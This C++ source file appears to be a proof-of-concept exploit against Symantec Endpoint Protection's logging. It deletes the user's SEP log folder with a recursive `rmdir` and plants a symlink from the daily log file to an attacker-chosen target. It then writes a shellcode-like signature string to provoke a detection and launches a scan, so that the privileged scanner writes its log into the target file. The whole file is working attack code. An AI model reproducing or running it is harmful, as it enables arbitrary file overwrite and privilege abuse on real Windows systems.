//  Copyright 2020 Neurosoft Inc. All Rights Reserved.
//
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//  http ://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.

#include "stdafx.h"

#include <FileSymlink.h>
#include <windows.h>
#include <string>
#include <ctime>

using namespace std;

bool createSignatureFile(wstring signatureName)
{

	// Open a handle to the file
	HANDLE hFile = CreateFile(
		signatureName.c_str(),
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_NEW,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		// Failed to open/create file
		return false;
	}

	// Just to avoid sig of the exe
	std::string signatureContent = "fce8820000006089e531c0648b50308b520c8b52148b722";
	std::string signatureContent2 = "80fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52";
	signatureContent.append(signatureContent2);
	DWORD bytesWritten;
	WriteFile(
		hFile,
		signatureContent.c_str(),
		signatureContent.size(),
		&bytesWritten,
		nullptr);


	CloseHandle(hFile);


	return true;
}


int _tmain(int argc, _TCHAR* argv[])
{

	LPCWSTR target = argv[1];
	wstring target_str(target);
	LPCWSTR contentToAdd = argv[2];
	wstring contentToAdd_str(contentToAdd);


	wstring scan_command = L"\"\"C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection\\DoScan.exe\" /ScanFile \"" + target_str + L"\"";
	string scan_command_for_system = string(scan_command.begin(), scan_command.end());
	
	system("\"\"C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection\\DoScan.exe\" /ScanFile \"C:\\windows\\system.ini\"\"");

	bool permanent = false;
	FileSymlink file(permanent);
	LPCWSTR baseobjdir = nullptr;

	string path = "C:\\Users\\";
	string username(1024, ' ');

	char str[70];
	time_t rawtime;
	struct tm timeinfo;
	time(&rawtime);
	localtime_s(&timeinfo, &rawtime);
	strftime(str, 100, "%m%d%Y.Log", &timeinfo);

	/*Construct Logs Path based on current user and current date*/
	DWORD len = GetEnvironmentVariableA("username", &username[0], username.size());
	username.resize(len);
	path.append(username);
	path.append("\\AppData\\Local\\Symantec\\Symantec Endpoint Protection\\Logs\\");
	/*Construct Logs Path based on current user and current date ---- END*/

	system(("rmdir /Q /S \"" + path + "\"").c_str());


	path.append(str); //construct log file


	std::wstring pathW = std::wstring(path.begin(), path.end());
	LPCWSTR symlink = pathW.c_str();
	

	//CreateNativeHardlink(symlink, target);
	file.CreateSymlink(symlink, target, baseobjdir);

	createSignatureFile(contentToAdd_str);


	system(scan_command_for_system.c_str());

	getc(stdin);

	return 0;

}

